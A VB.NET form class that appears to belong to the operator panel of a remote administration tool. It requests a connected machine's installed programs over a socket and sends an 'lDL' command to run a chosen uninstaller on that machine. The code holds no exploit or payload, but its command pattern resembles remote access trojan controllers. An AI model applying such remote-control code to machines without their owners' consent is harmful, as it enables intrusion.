Public Class Installed_Programs
    Public sock As Integer
    Dim Curr As Double = 0.0

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        If Curr < 635 Then '636
            Curr += 63.6
            Me.Size = New Size(Me.Width, Curr)
        Else
            Timer1.Stop()
            Reforge()
            Send_Load()
        End If
    End Sub
    Sub Send_Load()
        Main.S.Send(sock, "xxx")
    End Sub

    Private Sub Installed_Programs_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        Timer1.Start()
    End Sub
    Sub Reforge() '636 --> 300 --> 318
        Me.Location = New Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2 - Me.Width / 2, Screen.PrimaryScreen.WorkingArea.Size.Height / 2 - 318)

        Me.Refresh()
    End Sub
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub


    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click
        Me.Close()
    End Sub
    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click

        Main.S.Send(sock, "xxx")
    End Sub
    Private Sub UninstallToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles UninstallToolStripMenuItem.Click
        Dim sr$ = ListView1.FocusedItem.SubItems(5).Text
        If sr.EndsWith(".exe") Or sr.EndsWith(".msi") Then
            Main.S.Send(sock, "lDL" & Main.Yy & sr)
        Else
            MsgBox("Help : This is Not a program , it`s an update please find the program source uninstaller which contains pure executable path in silent uninstaller tab ", MsgBoxStyle.Critical)
        End If

    End Sub


#End Region
End Class